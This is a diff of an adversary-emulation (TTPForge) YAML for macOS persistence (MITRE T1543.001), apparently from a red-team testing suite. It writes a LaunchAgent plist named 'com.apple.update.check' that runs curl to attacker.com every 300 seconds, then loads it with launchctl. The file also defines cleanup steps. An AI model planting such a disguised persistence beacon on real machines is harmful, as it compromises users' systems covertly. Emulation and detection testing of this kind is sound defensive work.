@@ -1,62 +1,59 @@
+---
 api_version: 2.0
-uuid: 12345678-4444-4444-4444-444444444444
+uuid: 43f8614f-d430-48b6-81f9-076cd31da137
 name: Schedule with launchctl
-description: Uses launchctl to load and schedule a LaunchAgent for persistence
-mitre_attack_id: T1547.011
-mitre_attack_technique: Boot or Logon Initialization Scripts - Plist Modification
-mitre_attack_tactic: Persistence
-platforms:
-  - darwin
+authors:
+- TTPForge
+description: |
+  Uses launchctl to load and schedule a LaunchAgent for persistence
+mitre:
+  tactics:
+  - TA0003 Persistence
+  techniques:
+  - T1543 Create or Modify System Process
+  subtechniques:
+  - 'T1543.001 Create or Modify System Process: Launch Agent'
 requirements:
   platforms:
-    - os: darwin
+  - os: darwin
 args:
-  plist_path:
-    description: Full path to the plist file
-    type: string
-    default: ~/Library/LaunchAgents/com.apple.update.check.plist
-  service_label:
-    description: Label of the service to load
-    type: string
-    default: com.apple.update.check
+- name: plist_path
+  description: Full path to the plist file
+  type: string
+  default: ~/Library/LaunchAgents/com.apple.update.check.plist
+- name: service_label
+  description: Label of the service to load
+  type: string
+  default: com.apple.update.check
 steps:
-  - name: create_persistence_plist
-    type: create_file
-    path: "{{ plist_path }}"
-    contents: |
-      <?xml version="1.0" encoding="UTF-8"?>
-      <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-      <plist version="1.0">
-      <dict>
-          <key>Label</key>
-          <string>{{ service_label }}</string>
-          <key>ProgramArguments</key>
-          <array>
-              <string>/usr/bin/curl</string>
-              <string>http://attacker.com/beacon</string>
-          </array>
-          <key>RunAtLoad</key>
-          <true/>
-          <key>StartInterval</key>
-          <integer>300</integer>
-      </dict>
-      </plist>
-    permissions: "0644"
-  
-  - name: load_launchctl
-    type: shell_command
-    command: "launchctl load {{ plist_path }}"
-
-checks:
-  - type: file_exists
-    path: "{{ plist_path }}"
-  - type: shell_command
-    command: "launchctl list | grep {{ service_label }}"
-    expected_output: "{{ service_label }}"
-
-cleanup:
-  - type: shell_command
-    command: "launchctl unload {{ plist_path }}" 
-    on_error: ignore
-  - type: remove_file
-    path: "{{ plist_path }}"
+- name: create_persistence_plist
+  create_file: '{{ .Args.plist_path }}'
+  contents: |
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+    <plist version="1.0">
+    <dict>
+        <key>Label</key>
+        <string>{{ .Args.service_label }}</string>
+        <key>ProgramArguments</key>
+        <array>
+            <string>/usr/bin/curl</string>
+            <string>http://attacker.com/beacon</string>
+        </array>
+        <key>RunAtLoad</key>
+        <true/>
+        <key>StartInterval</key>
+        <integer>300</integer>
+    </dict>
+    </plist>
+  mode: 420
+  cleanup: default
+- name: load_launchctl
+  inline: launchctl load {{ .Args.plist_path }}
+  cleanup:
+    inline: |-
+      launchctl unload {{ .Args.plist_path }}
+      rm -f "{{ .Args.plist_path }}"
+tests:
+- name: dry_run_test
+  dry_run: true
